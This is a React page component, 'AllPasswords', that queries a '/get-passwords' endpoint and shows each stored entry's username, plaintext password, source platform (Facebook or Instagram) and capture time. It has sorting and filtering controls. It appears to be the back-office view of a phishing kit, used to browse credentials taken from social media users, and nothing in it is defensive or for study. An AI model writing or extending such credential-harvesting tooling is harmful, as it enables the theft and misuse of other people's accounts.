import React, { useEffect, useState } from "react";
import NavBar from "../components/navbar";
import axios from "axios";
import Processing from "../components/processing";
import SideBar from "../components/sidebar";

function AllPasswords() {
    let query = "";
    let [maxItems, setMaxItems] = useState(20)
    let [sortBy, setSortBy] = useState("")
    let [selectedItem, setSelectedItem] = useState("")
    let [fetchedData, setFetchedData] = useState({})
    let [isProcessing, setIsProcessing] = useState(true)
    let [reset, setReset] = useState(0);

    query = `?limit=${maxItems}${sortBy == "" || sortBy == "Select" ? "" : "&sortBy=" + sortBy}${selectedItem == "" || selectedItem == "Select" ? "" : "&selectedItem=" + selectedItem}`
    useEffect(() => {
        setIsProcessing(true)
        axios.get("/get-passwords" + query).then((res) => {
            setFetchedData(res.data.data)
            setIsProcessing(false)
        }).catch(() => {
            console.log("Got some error liui65")
        })

    }, [])

    function handleSubmit() {
        setIsProcessing(true)
        axios.get("/get-passwords" + query).then((res) => {
            setFetchedData(res.data.data)
            setIsProcessing(false)
        }).catch(() => {
            console.log("Got some error sdf987")
        })
    }


    return (
        <>
            <NavBar />
            <div className="d-flex">
                <SideBar />
                {isProcessing == false ?
                    <>
                        <div className="d-flex flex-column">
                            <div className="m-5 px-5 ">
                                <h1 className="p-4 text-center">All entries</h1>
                                <div className="border border-1 p-4">
                                    <p className="d-inline px-3"><b>Max Items : </b></p>
                                    <select onChange={(e) => setMaxItems(e.target.value)}>
                                        <option value={20}>20</option>
                                        <option value={50}>50</option>
                                        <option value={100}>100</option>
                                    </select>
                                    <p className="d-inline px-3"><b>Sort By : </b></p>
                                    <select onChange={(e) => setSortBy(e.target.value)}>
                                        <option value={null}>Select</option>
                                        <option value={"timing"}>timing</option>
                                        <option value={"alphabet"}>alphabet</option>
                                    </select>
                                    <p className="d-inline px-3"><b>Entries from : </b></p>
                                    <select onChange={(e) => setSelectedItem(e.target.value)}>
                                        <option value={null}>Select</option>
                                        <option value={"facebook"}>Facebook</option>
                                        <option value={"instagram"}>Instagram</option>
                                    </select>
                                    <button onClick={handleSubmit} className="btn btn-outline-primary px-4 mx-5">Apply</button>

                                    <p className="px-3">Showing {fetchedData.length} result</p>
                                </div>
                            </div>
                            <div className="w-100 d-flex flex-column align-items-center justify-content-center">
                                {
                                    fetchedData.length == 0 ?
                                        <p className="text-center">No Entries Till Now</p>
                                        :
                                        fetchedData.map((k, key) => {
                                            return (
                                                <div key={key} className="py-2 w-75 px-4 border border-1 my-3">
                                                    <div className="d-flex justify-content-between"><p><b>{k.id}</b></p></div>
                                                    <div className="d-flex justify-content-between"><p><b>UserName : </b></p><p>{k.userName}</p></div>
                                                    <div className="d-flex justify-content-between"><p><b>Password : </b></p><p>{k.password}</p></div>
                                                    <div className="d-flex justify-content-between"><p><b>Selected Item : </b></p><p>{k.selectedItem}</p></div>
                                                    <div className="d-flex justify-content-between"><p><b>TIming : </b></p><p>{new Date(parseInt(k.timing)).toLocaleString()}</p></div>
                                                </div>
                                            )
                                        })
                                }
                            </div>
                        </div>
                    </>
                    : <Processing />
                }
            </div>
        </>
    )
}

export default AllPasswords;